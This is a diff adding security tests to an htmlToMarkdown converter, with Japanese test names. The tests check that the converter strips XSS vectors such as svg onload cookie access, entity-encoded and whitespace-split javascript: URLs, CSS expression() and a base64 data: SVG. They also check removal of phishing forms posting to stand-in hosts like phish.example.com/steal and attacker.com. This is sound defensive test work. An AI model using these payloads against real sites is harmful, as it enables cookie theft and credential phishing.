@@ -249,6 +249,125 @@ describe('htmlToMarkdown – security', () => {
   });
 
   // ---------------------------------------------------------------------------
+  // SVG onload / CSS インジェクション（既存 SVG テストの補強）
+  // ---------------------------------------------------------------------------
+  describe('SVG onload and CSS injection', () => {
+    it('<svg onload="alert(1)"> を除去する', () => {
+      const html = '<svg onload="alert(document.cookie)"><rect width="100" height="100"/></svg>';
+      const result = htmlToMarkdown(html);
+      expect(result).not.toContain('onload');
+      expect(result).not.toContain('document.cookie');
+    });
+
+    it('style 属性内の CSS expression インジェクションを除去する', () => {
+      const html = '<div style="background:url(javascript:alert(1))">text</div>';
+      const result = htmlToMarkdown(html);
+      expect(result).not.toContain('javascript:');
+    });
+
+    it('style 属性内の expression() (IE legacy) を除去する', () => {
+      const html = '<p style="width:expression(alert(1))">text</p>';
+      const result = htmlToMarkdown(html);
+      expect(result).not.toContain('expression(');
+    });
+
+    it('SVG の use タグによる XSS を除去する', () => {
+      // <svg><use href="data:image/svg+xml,...#exploit"></svg> パターン
+      const html =
+        '<svg><use href="data:image/svg+xml;base64,PHN2ZyBvbmxvYWQ9ImFsZXJ0KDEpIi8+"></use></svg>';
+      const result = htmlToMarkdown(html);
+      // data:image/svg+xml を含む href が出力されないこと
+      expect(result).not.toContain('data:image/svg+xml');
+    });
+  });
+
+  // ---------------------------------------------------------------------------
+  // HTML エンティティ多重エンコード（二重エンコード XSS）
+  // ---------------------------------------------------------------------------
+  describe('HTML entity double-encoding', () => {
+    it('&#106;&#97;&#118;&#97;... 形式のエンティティが javascript: に展開されない', () => {
+      // &#106; = j, &#97; = a, &#118; = v, &#97; = a, &#115; = s, ...
+      const html =
+        '<a href="&#106;&#97;&#118;&#97;&#115;&#99;&#114;&#105;&#112;&#116;&#58;alert(1)">click</a>';
+      const result = htmlToMarkdown(html);
+      expect(result).not.toContain('javascript:');
+      expect(result).not.toContain('alert(1)');
+    });
+
+    it('16進エンティティ &#x6A;&#x61;&#x76;... が javascript: に展開されない', () => {
+      const html =
+        '<a href="&#x6A;&#x61;&#x76;&#x61;&#x73;&#x63;&#x72;&#x69;&#x70;&#x74;&#x3A;alert(1)">link</a>';
+      const result = htmlToMarkdown(html);
+      expect(result).not.toContain('javascript:');
+    });
+  });
+
+  // ---------------------------------------------------------------------------
+  // フォームフィッシング（フォームが Markdown に残存しないこと）
+  // ---------------------------------------------------------------------------
+  describe('form phishing removal', () => {
+    it('hidden input を含むフォームを除去する', () => {
+      const html =
+        '<form action="https://phish.example.com/steal" method="POST">' +
+        '<input type="hidden" name="csrf" value="token123">' +
+        '<input type="text" name="password" placeholder="パスワード">' +
+        '<button type="submit">ログイン</button>' +
+        '</form>';
+      const result = htmlToMarkdown(html);
+      expect(result).not.toContain('phish.example.com');
+      expect(result).not.toContain('<form');
+      expect(result).not.toContain('type="hidden"');
+      expect(result).not.toContain('csrf');
+    });
+
+    it('action 属性付き form が除去される', () => {
+      const html = '<form action="//attacker.com"><input name="q"><button>送信</button></form>';
+      const result = htmlToMarkdown(html);
+      expect(result).not.toContain('attacker.com');
+    });
+  });
+
+  // ---------------------------------------------------------------------------
+  // 追加のポリモーフィック攻撃ベクター
+  // ---------------------------------------------------------------------------
+  describe('additional polymorphic vectors', () => {
+    it('Tab 文字を含む javascript: プロトコルを除去する', () => {
+      const html = '<a href="java\tscript:alert(1)">click</a>';
+      const result = htmlToMarkdown(html);
+      expect(result).not.toMatch(/java[\t]?script:/i);
+    });
+
+    it('改行文字を含む javascript: プロトコルを除去する', () => {
+      const html = '<a href="java\nscript:alert(1)">click</a>';
+      const result = htmlToMarkdown(html);
+      expect(result).not.toMatch(/java[\n]?script:/i);
+    });
+
+    it('大文字の JAVASCRIPT: プロトコルを除去する', () => {
+      const html = '<a href="JAVASCRIPT:alert(1)">click</a>';
+      const result = htmlToMarkdown(html);
+      expect(result).not.toContain('JAVASCRIPT:');
+      expect(result).not.toContain('javascript:');
+    });
+
+    it('onanimationend ハンドラを除去する', () => {
+      const html = '<div onanimationend="steal()">text</div>';
+      const result = htmlToMarkdown(html);
+      expect(result).not.toContain('onanimationend');
+      expect(result).not.toContain('steal()');
+    });
+
+    it('formaction 属性を除去する', () => {
+      // <button formaction> は form action を上書きできる攻撃ベクター
+      const html =
+        '<form><input type="text"><button formaction="https://phish.com" type="submit">送信</button></form>';
+      const result = htmlToMarkdown(html);
+      expect(result).not.toContain('formaction');
+      expect(result).not.toContain('phish.com');
+    });
+  });
+
+  // ---------------------------------------------------------------------------
   // 正常なコンテンツが正しく変換されること（回帰テスト）
   // ---------------------------------------------------------------------------
   describe('normal content regression', () => {
